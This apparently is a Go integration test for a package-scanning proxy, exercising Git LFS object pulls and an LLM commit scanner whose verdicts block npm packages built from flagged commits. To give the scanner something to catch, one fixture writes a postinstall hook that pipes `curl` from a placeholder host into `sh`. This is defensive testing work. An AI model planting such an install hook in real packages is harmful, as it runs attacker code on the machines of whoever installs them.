//go:build integration
// +build integration

package pkgscan

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/cgi"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

// Git is served by the proxy's Git backend, not through the package pipeline,
// and the package scan does not examine a clone or a fetch: what a commit
// changes is the LLM commit scan's to judge, and its verdicts gate the
// packages built from that commit (provenance → admission policy). What the
// package scan does examine on a Git upstream is a Git LFS object — fetched
// apart from the clone, through the batch API, and checked out all the same.
//
// So Git has two rows:
//
//   - git-lfs, a standard row: the objects of a repository's LFS store, pulled
//     the way the git-lfs client pulls them (a batch negotiation, then the
//     object from the href the proxy handed out), go through every scenario.
//   - git, a custom row: with the package scan on, the commit scanner still
//     judges the repository's commits, and the package pinned to the flagged
//     commit is still refused — before it is fetched, so the refusal is the
//     commit scan's — while the package pinned to the benign commit is served
//     and package-scanned. A clone through the proxy is served: Git traffic
//     itself passes no gate (see docs/llm-package-scan.md, "Git and Git LFS").

func init() {
	register(eco{
		ID: "git-lfs", Type: "git", Title: "Git LFS objects",
		Format:   "Git LFS object (a tar.gz bundle) via the batch API",
		Registry: lfsRegistry,
		Configure: func(cfg map[string]any, _ configEnv) {
			cfg["git"] = map[string]any{"lfs": map[string]any{"enabled": true}}
		},
	})
	register(eco{
		ID: "git", Type: "git", Title: "Git (commit scan)",
		Format: "commits judged by the LLM commit scan; npm packages pinned to them; a clone",
		Custom: runGitCommitScan,
	})
}

// ---------------------------------------------------------------------------
// git-lfs
// ---------------------------------------------------------------------------

// lfsRepo is the repository whose LFS store the git-lfs row reads.
const lfsRepo = "pte2e/assets.git"

// lfsMediaType is the media type of the batch API's requests and responses.
const lfsMediaType = "application/vnd.git-lfs+json"

// lfsRegistry plays an LFS server: the batch API of one repository answers
// every object it holds with a download action on an object host (the stub
// again, under /lfs-store/), which serves the bytes. An LFS object is opaque to
// Git; these are tar.gz bundles, a common thing to keep in LFS.
func lfsRegistry(env stubEnv) (*registry, error) {
	reg := newRegistry()
	objects := map[string][]byte{} // oid -> content
	for _, s := range env.Specs {
		bundle := tarGz(map[string]string{
			"bundle/README.md":     "Assets bundle " + s.Slug() + ", kept in Git LFS.\n",
			"bundle/" + markerFile: s.Text(""),
		})
		oid := hexOf(bundle)
		objects[oid] = bundle
		reg.mux.File("/lfs-store/"+oid, bundle, "application/octet-stream")

		objectPath := "/" + lfsRepo + "/info/lfs/objects/" + oid
		request := jsonDoc(map[string]any{
			"operation": "download",
			"transfers": []string{"basic"},
			"objects":   []map[string]any{{"oid": oid, "size": len(bundle)}},
		})
		reg.add(s.Variant, &pkgPull{
			// The gate names an LFS object by its repository and its object ID.
			Name: lfsRepo, Version: oid,
			// git-lfs negotiates the download with the batch API: the proxy must
			// answer with an href on itself, not on the object host.
			Preamble: []step{{
				Path: "/" + lfsRepo + "/info/lfs/objects/batch", Method: http.MethodPost, Body: request,
				Header:   http.Header{"Accept": {lfsMediaType}, "Content-Type": {lfsMediaType}},
				Contains: []string{mountPlaceholder + objectPath},
			}},
			// The href the proxy hands out carries the declared size.
			Payload: step{Path: objectPath + "?size=" + strconv.Itoa(len(bundle))},
			Body:    bundle,
			Marker:  "bundle/" + markerFile,
		})
	}

	// The batch API: POST <repo>/info/lfs/objects/batch.
	reg.mux.Handle("/"+lfsRepo+"/info/lfs/objects/batch", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "the batch API takes a POST", http.StatusMethodNotAllowed)
			return
		}
		var req struct {
			Operation string `json:"operation"`
			Objects   []struct {
				OID  string `json:"oid"`
				Size int64  `json:"size"`
			} `json:"objects"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Operation != "download" {
			http.Error(w, "a download batch request was expected", http.StatusUnprocessableEntity)
			return
		}
		var out []map[string]any
		for _, o := range req.Objects {
			content, ok := objects[o.OID]
			if !ok {
				out = append(out, map[string]any{"oid": o.OID, "size": o.Size,
					"error": map[string]any{"code": http.StatusNotFound, "message": "object does not exist"}})
				continue
			}
			out = append(out, map[string]any{"oid": o.OID, "size": len(content), "authenticated": true,
				"actions": map[string]any{"download": map[string]any{"href": env.URL + "/lfs-store/" + o.OID}}})
		}
		w.Header().Set("Content-Type", lfsMediaType)
		_, _ = w.Write(jsonDoc(map[string]any{"transfer": "basic", "objects": out, "hash_algo": "sha256"}))
	})
	return reg, nil
}

// ---------------------------------------------------------------------------
// git: the commit scan, with the package scan on
// ---------------------------------------------------------------------------

// The npm packages built from the repository's commits. Both are benign to the
// package scan (neither carries the malicious marker): a refusal of the one
// built from the flagged commit can only be the commit scan's.
const (
	gitPkgFromBenign  = "pte2e-from-benign-commit"
	gitPkgFromFlagged = "pte2e-from-flagged-commit"
	// gitNpmUpstream is the name of the npm upstream the packages come from.
	gitNpmUpstream = "npm"
	// gitRepoName is the repository the git upstream serves and the commit
	// scanner watches.
	gitRepoName = "source.git"
)

// gitSource is the fixture repository.
type gitSource struct {
	// Root holds the bare repository (Root/source.git), as `git http-backend`
	// expects its project root.
	Root string
	// Benign and Flagged are the commit hashes: a library change, then an
	// install hook that pipes a remote script into a shell.
	Benign, Flagged string
}

// Bare is the path of the bare repository.
func (g gitSource) Bare() string { return filepath.Join(g.Root, gitRepoName) }

// gitEnv is the environment every git command of the row runs with: no user
// or system configuration, fixed identities.
func gitEnv() []string {
	return append(os.Environ(),
		"GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_SYSTEM=/dev/null", "GIT_TERMINAL_PROMPT=0",
		"GIT_AUTHOR_NAME=pkgscan e2e", "GIT_AUTHOR_EMAIL=pkgscan-e2e@example.invalid",
		"GIT_COMMITTER_NAME=pkgscan e2e", "GIT_COMMITTER_EMAIL=pkgscan-e2e@example.invalid",
	)
}

// runGit runs git in dir and returns its trimmed output.
func runGit(dir string, extraEnv []string, args ...string) (string, error) {
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	cmd.Env = append(gitEnv(), extraEnv...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("git %s: %v: %s", strings.Join(args, " "), err, firstLine(out))
	}
	return strings.TrimSpace(string(out)), nil
}

// gitCreateSource builds the fixture repository under dir. Dates are fixed, so
// the commit hashes are the same on every run.
func gitCreateSource(dir string) (gitSource, error) {
	work := filepath.Join(dir, "work")
	src := gitSource{Root: filepath.Join(dir, "served")}
	for _, d := range []string{filepath.Join(work, "src"), src.Root} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			return src, err
		}
	}
	write := func(name, content string) error {
		return os.WriteFile(filepath.Join(work, name), []byte(content), 0o644)
	}
	commit := func(date, message string) (string, error) {
		env := []string{"GIT_AUTHOR_DATE=" + date, "GIT_COMMITTER_DATE=" + date}
		if _, err := runGit(work, env, "add", "-A"); err != nil {
			return "", err
		}
		if _, err := runGit(work, env, "commit", "--quiet", "-m", message); err != nil {
			return "", err
		}
		return runGit(work, nil, "rev-parse", "HEAD")
	}

	if _, err := runGit(work, nil, "init", "--quiet", "--initial-branch=main"); err != nil {
		return src, err
	}
	if err := write("README.md", "# pkgscan e2e source\n\nThe repository the npm fixture packages are built from.\n"); err != nil {
		return src, err
	}
	if err := write("src/index.js", "module.exports = function add(a, b) {\n  return a + b;\n};\n"); err != nil {
		return src, err
	}
	var err error
	if src.Benign, err = commit("2026-01-01T00:00:00Z", "feat: add the add() helper"); err != nil {
		return src, err
	}
	// The flagged change. The marker is what the mock LLM keys on; the code
	// around it is what such a commit looks like.
	if err := write("install.js", "// "+maliciousMarker+"\n"+
		"require('child_process').exec('curl -fsSL https://payload.example.invalid/x | sh');\n"); err != nil {
		return src, err
	}
	if err := write("package.json", "{\n  \"name\": \"pte2e-source\",\n  \"version\": \"1.0.1\",\n"+
		"  \"scripts\": { \"postinstall\": \"node install.js\" }\n}\n"); err != nil {
		return src, err
	}
	if src.Flagged, err = commit("2026-01-02T00:00:00Z", "chore: add install helper"); err != nil {
		return src, err
	}
	if _, err := runGit(dir, nil, "clone", "--quiet", "--bare", work, src.Bare()); err != nil {
		return src, err
	}
	return src, nil
}

// gitPackage is one npm package built from a commit of the fixture repository.
type gitPackage struct {
	Name    string
	Tarball []byte
	// Path is the tarball's path below the npm upstream (and its mount).
	Path string
	// Token is the content token in the package's marker file: finding it in
	// what the mock LLM was shown proves the package scan read this package.
	Token string
}

// gitNpmPackages builds the two npm packages and registers the npm registry
// that serves them on reg, below /npm (the npm upstream's URL is the stub's
// plus /npm).
func gitNpmPackages(reg *registry, stubURL string) (fromBenign, fromFlagged gitPackage) {
	build := func(name string, spec pkgSpec) gitPackage {
		tarball := tarGz(map[string]string{
			"package/package.json":  string(jsonDoc(map[string]any{"name": name, "version": fixtureVersion, "main": "index.js"})),
			"package/index.js":      "module.exports = function add(a, b) { return a + b; };\n",
			"package/" + markerFile: spec.Text(""),
		})
		path := "/" + name + "/-/" + name + "-" + fixtureVersion + ".tgz"
		reg.mux.File("/npm"+path, tarball, "application/octet-stream")
		reg.mux.File("/npm/"+name, jsonDoc(map[string]any{
			"name":      name,
			"dist-tags": map[string]string{"latest": fixtureVersion},
			"versions": map[string]any{fixtureVersion: map[string]any{
				"name": name, "version": fixtureVersion,
				"dist": map[string]string{"tarball": stubURL + "/npm" + path},
			}},
		}), "application/json")
		return gitPackage{Name: name, Tarball: tarball, Path: path, Token: spec.Token}
	}
	// Both are the benign variant's text, under tokens of their own.
	return build(gitPkgFromBenign, newSpec("git/"+gitPkgFromBenign, benign)),
		build(gitPkgFromFlagged, newSpec("git/"+gitPkgFromFlagged, benign))
}

// gitConfigure adds what the git row's proxy needs beyond the git upstream:
// the npm upstream, the commit scanner watching the repository, provenance
// pins tying each package to its commit, and the admission policy that refuses
// a package whose source commit the scanner flagged.
func gitConfigure(src gitSource, stubURL string) func(cfg map[string]any, env configEnv) {
	return func(cfg map[string]any, env configEnv) {
		ups := cfg["upstreams"].(map[string]any)
		ups[gitNpmUpstream] = map[string]any{"type": "npm", "url": stubURL + "/npm"}

		cfg["scanning"] = map[string]any{
			"enabled":  true,
			"provider": env.LLMProvider,
			"baseUrl":  env.LLMBaseURL,
			"apiKey":   mockAPIKey,
			"failOn":   "high",
			"commit":   map[string]any{"storeDir": filepath.Join(env.StateDir, "commit-verdicts")},
			"watch": map[string]any{
				"enabled":   true,
				"mirrorDir": filepath.Join(env.StateDir, "commit-mirrors"),
				"stateDir":  filepath.Join(env.StateDir, "commit-cursors"),
				// Scan the existing history on first sight, then poll.
				"backfill":     true,
				"pollInterval": "2s",
				"repos": []any{map[string]any{
					"name": "pte2e-source", "url": src.Bare(), "branches": []any{"main"},
				}},
			},
		}
		pin := func(name, commit string) map[string]any {
			return map[string]any{"ecosystem": "npm", "name": name, "version": fixtureVersion, "repository": src.Bare(), "commit": commit}
		}
		cfg["provenance"] = map[string]any{
			"enabled":  true,
			"storeDir": filepath.Join(env.StateDir, "provenance"),
			"pins":     []any{pin(gitPkgFromBenign, src.Benign), pin(gitPkgFromFlagged, src.Flagged)},
		}
		cfg["policy"] = map[string]any{
			"enabled":    true,
			"failClosed": true,
			"default": map[string]any{
				"blockMalicious": true,
				// Only a coordinate with a known-malicious source commit is refused.
				"onMissingProvenance": "allow",
				"onMissingScan":       "allow",
			},
		}
	}
}

// commitVerdict is a commit scanner verdict, as the admin API lists it.
type commitVerdict struct {
	SHA       string `json:"sha"`
	RiskScore int    `json:"riskScore"`
	Malicious bool   `json:"malicious"`
}

// commitVerdicts lists the commit scanner's verdicts, keyed by commit hash.
func (p *proxyProc) commitVerdicts() (map[string]commitVerdict, error) {
	var resp struct {
		Enabled bool            `json:"enabled"`
		Items   []commitVerdict `json:"items"`
	}
	if err := p.adminJSON("scans?limit=1000", &resp); err != nil {
		return nil, err
	}
	if !resp.Enabled {
		return nil, fmt.Errorf("commit scanning is not enabled in the proxy")
	}
	out := make(map[string]commitVerdict, len(resp.Items))
	for _, v := range resp.Items {
		out[v.SHA] = v
	}
	return out, nil
}

// runGitCommitScan is the git row.
func runGitCommitScan(r *runner) {
	began := time.Now()
	defer func() { r.row.Seconds = time.Since(began).Seconds() }()
	for _, sc := range packageScenarios() {
		r.row.na(sc)
	}
	sc := scCommitScan

	gitBin, err := exec.LookPath("git")
	if err != nil {
		r.t.Fatalf("[git] the git row needs the git binary: %v", err)
	}
	src, err := gitCreateSource(filepath.Join(r.dir, "source"))
	if err != nil {
		r.t.Fatalf("[git] creating the fixture repository: %v", err)
	}

	// One stub plays both upstreams: the real `git http-backend` serves the
	// repository (smart HTTP), and an npm registry below /npm serves the
	// packages built from it.
	reg := newRegistry()
	httpBackend := &cgi.Handler{
		Path: gitBin,
		Args: []string{"http-backend"},
		Env:  []string{"GIT_PROJECT_ROOT=" + src.Root, "GIT_HTTP_EXPORT_ALL=1", "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_SYSTEM=/dev/null"},
	}
	reg.mux.Fallback(func(w http.ResponseWriter, req *http.Request) bool {
		if strings.HasPrefix(req.URL.Path, "/npm/") {
			return false
		}
		// The proxy streams a client's upload-pack request on with chunked
		// encoding, as git itself does for a large request; a Git server takes
		// that, but Go's CGI host refuses a chunked body. Hand it a sized one.
		if req.Body != nil {
			body, err := io.ReadAll(io.LimitReader(req.Body, 64<<20))
			if err != nil {
				http.Error(w, "reading the request body", http.StatusBadRequest)
				return true
			}
			req.Body = io.NopCloser(bytes.NewReader(body))
			req.ContentLength = int64(len(body))
			req.TransferEncoding = nil
		}
		httpBackend.ServeHTTP(w, req)
		return true
	})
	srv := httptest.NewServer(reg.mux)
	r.stub = &stub{srv: srv, reg: reg}
	fromBenign, fromFlagged := gitNpmPackages(reg, srv.URL)
	r.e.Configure = gitConfigure(src, srv.URL)

	llm := r.llm()
	p := r.start("strict", filepath.Join(r.dir, "state"), &gateConfig{Provider: "claude", Action: "quarantine", FailMode: "closed"}, llm)
	r.checkPosture(p, "claude", "quarantine", "closed")

	// 1. The commit scanner judges the repository's history.
	var verdicts map[string]commitVerdict
	deadline := time.Now().Add(90 * time.Second)
	for {
		verdicts, err = p.commitVerdicts()
		_, okB := verdicts[src.Benign]
		_, okF := verdicts[src.Flagged]
		if (err == nil && okB && okF) || time.Now().After(deadline) {
			break
		}
		time.Sleep(250 * time.Millisecond)
	}
	switch {
	case err != nil:
		r.failf(sc, "reading the commit scanner's verdicts: %v", err)
		return
	case verdicts[src.Benign].SHA == "" || verdicts[src.Flagged].SHA == "":
		r.failf(sc, "the commit scanner did not judge both commits within 90s (%d verdict(s))", len(verdicts))
		return
	case verdicts[src.Benign].Malicious:
		r.failf(sc, "the commit scanner calls the benign commit %s malicious", src.Benign)
	case !verdicts[src.Flagged].Malicious:
		r.failf(sc, "the commit scanner does not flag commit %s (risk %d)", src.Flagged, verdicts[src.Flagged].RiskScore)
	}
	outcomes := map[string]int{}
	for _, c := range llm.CommitScans() {
		outcomes[c.Outcome]++
	}
	if outcomes["malicious"] == 0 || outcomes["benign"] == 0 {
		r.failf(sc, "the verdicts did not come from the LLM: the mock answered %v to commit-scan prompts", outcomes)
	}

	npmMount := p.mountOf(gitNpmUpstream)
	pull := func(pk gitPackage) *response {
		doc, err := p.getFrom(npmMount, step{Path: "/" + pk.Name})
		if err != nil {
			r.failf(sc, "requesting the packument of %s: %v", pk.Name, err)
			return nil
		}
		if doc.Status != http.StatusOK {
			r.failf(sc, "the packument of %s returned %d, want 200 (headers: %s): %s", pk.Name, doc.Status, gateHeaders(doc.Header), firstLine(doc.Body))
			return nil
		}
		if want := npmMount + pk.Path; !strings.Contains(string(doc.Body), want) {
			r.failf(sc, "the packument of %s does not send the client to %s", pk.Name, want)
		}
		res, err := p.getFrom(npmMount, step{Path: pk.Path})
		if err != nil {
			r.failf(sc, "pulling %s: %v", pk.Name, err)
			return nil
		}
		return res
	}

	// 2. The package built from the benign commit passes both scans.
	if res := pull(fromBenign); res != nil {
		switch {
		case res.Status != http.StatusOK || string(res.Body) != string(fromBenign.Tarball):
			r.failf(sc, "%s (benign commit) returned %d, want 200 and the tarball (headers: %s)", fromBenign.Name, res.Status, gateHeaders(res.Header))
		case res.Header.Get(hdrDecision) != "clean":
			r.failf(sc, "%s was served with %s = %q: the package scan did not judge it", fromBenign.Name, hdrDecision, res.Header.Get(hdrDecision))
		}
	}
	if len(llm.PackageScans(fromBenign.Token)) == 0 {
		r.failf(sc, "the package scan never read %s: with the commit scan configured, the package scan must still run", fromBenign.Name)
	}

	// 3. The package built from the flagged commit is refused by the commit
	// scan's verdict — before the proxy fetched it, so the package scan never
	// saw it either.
	if res := pull(fromFlagged); res != nil {
		if res.Status != http.StatusForbidden || res.Header.Get(hdrPolicyCode) != "malicious" {
			r.failf(sc, "%s (flagged commit) returned %d with %s = %q, want 403 and the commit scan's policy code \"malicious\" (headers: %s)",
				fromFlagged.Name, res.Status, hdrPolicyCode, res.Header.Get(hdrPolicyCode), gateHeaders(res.Header))
		}
	}
	if n := reg.mux.Hits("/npm" + fromFlagged.Path); n != 0 {
		r.failf(sc, "the registry served the tarball of %s %d time(s): the refusal must come before the fetch", fromFlagged.Name, n)
	}
	if n := len(llm.PackageScans(fromFlagged.Token)); n != 0 {
		r.failf(sc, "the package scan read %s, which the commit scan's verdict refuses before any fetch", fromFlagged.Name)
	}

	// 4. A clone through the proxy, with the package scan on: Git traffic is
	// served, flagged commit included — no gate examines a clone or a fetch.
	clone := filepath.Join(r.dir, "clone")
	if _, err := runGit(r.dir, nil, "clone", "--quiet", p.mount()+"/"+gitRepoName, clone); err != nil {
		r.failf(sc, "cloning through the proxy failed: %v", err)
	} else if head, err := runGit(clone, nil, "rev-parse", "HEAD"); err != nil || head != src.Flagged {
		r.failf(sc, "the clone's HEAD is %q (%v), want %s", head, err, src.Flagged)
	} else {
		r.row.note("a clone through the proxy delivers the flagged commit %s: Git clones and fetches pass no admission gate (the commit scan's verdicts gate packages, not Git traffic)", src.Flagged[:12])
	}

	p.stop()
	if err := verifyAudit(r.bin, p.pc.StateDir); err != nil {
		r.failf(sc, "%v", err)
	}
	r.row.LLMCalls = len(llm.Calls())
	r.row.ScannedAs = fmt.Sprintf("commits %s (benign) and %s (flagged)", src.Benign[:7], src.Flagged[:7])
	r.row.pass(sc)
}
